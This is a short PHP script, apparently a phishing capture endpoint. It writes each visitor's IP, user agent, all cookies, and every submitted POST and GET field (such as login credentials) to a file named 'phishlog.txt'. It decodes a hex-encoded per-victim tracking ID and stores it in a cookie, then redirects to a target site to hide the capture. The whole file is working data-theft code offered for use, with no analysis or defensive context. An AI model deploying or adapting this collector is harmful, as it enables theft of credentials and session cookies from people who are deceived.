<?php
# Отельное спасибо dinimus :D
############### SETTINGS ###############
$LOGFILE = 'topsecret/phishlog.txt';
$URLRedirect = 'https://target.ru';
$UserIdHexParamName = 'secid';
########################################
$ip = getenv('REMOTE_ADDR');
$userAgent = getenv('HTTP_USER_AGENT');
$LOG = '';
$today = date("Y-m-d H:i:s");  
$LOG .= "Date: $today \n\r";
$LOG .= "IP: $ip \n\r";
$LOG .= "UserAgent: $userAgent \n\r";
foreach ($_COOKIE as $key => $value) {
if ($key == $UserIdHexParamName) {
    $dehex = hex2bin($value);
    $LOG .= "Visitor ID from COOKIE: ".htmlspecialchars($dehex)."\n\r";
} else {
    $LOG .= "Cookie \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
}
}
foreach ($_POST as $key => $value) {
if ($key == $UserIdHexParamName) {
    $dehex = hex2bin($value);
    setcookie($UserIdHexParamName, $value); 
    $LOG .= "Visitor ID from POST: ".htmlspecialchars($dehex)."\n\r";
} else {
    $LOG .= "POST Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";    
}
}
foreach ($_GET as $key => $value) {
if ($key == $UserIdHexParamName) {
    $dehex = hex2bin($value);
    setcookie($UserIdHexParamName, $value); 
    $LOG .= "Visitor ID from GET: ".htmlspecialchars($dehex)."\n\r";
} else {
    $LOG .= "GET Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
}
}
$LOG .= "--------------------------------------\n\r";
@file_put_contents($LOGFILE, $LOG, FILE_APPEND);
header("Location: $URLRedirect");
exit;
?>

